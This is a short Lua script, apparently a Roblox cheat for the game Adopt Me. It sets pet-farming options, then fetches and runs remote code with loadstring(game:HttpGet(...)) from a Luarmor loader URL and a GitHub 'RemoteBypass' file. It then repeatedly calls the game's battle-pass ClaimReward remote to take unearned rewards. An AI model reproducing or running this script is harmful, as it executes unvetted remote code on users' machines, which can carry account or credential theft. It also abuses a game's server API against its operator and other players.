

script_key="WorkFine";
getgenv().Config = {
    ["PetAMountToBuy"] = "0", -- can be 999
    ["PetRemoteToBuy"] = "moon_2025_egg",

    ["PetFarmAutoSwitchFullGrown"] = false,
    ["PetFarmActive"] = false,
    ["LitePetFarmActive"] = true,
    ["EggFarmActive"] = false,
    
    ["HideUselessGui"] = true,
    ["Blur_username"] = true,
    ["Blazing_Lion_Log"] = false,
    ["DiscordId"] = "123456",
    ["Webhook"] = "",
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
wait(1)
wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(0.1)
-- Define the core function to claim the reward
local function claimReward(tier)
    local args = {
        "house_pets_2025_pass_1",
        tier
    }
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("BattlePassAPI/ClaimReward"):InvokeServer(unpack(args))
end

-- Main loop to run the script
while true do
    -- Loop from 1 to 20 for the reward tiers
    for i = 1, 20 do
        claimReward(i)
        -- Wait 0.5 seconds before the next claim
        task.wait(0.5)
    end
    -- Wait 30 seconds before starting the cycle again
    task.wait(30)
end
wait(1)
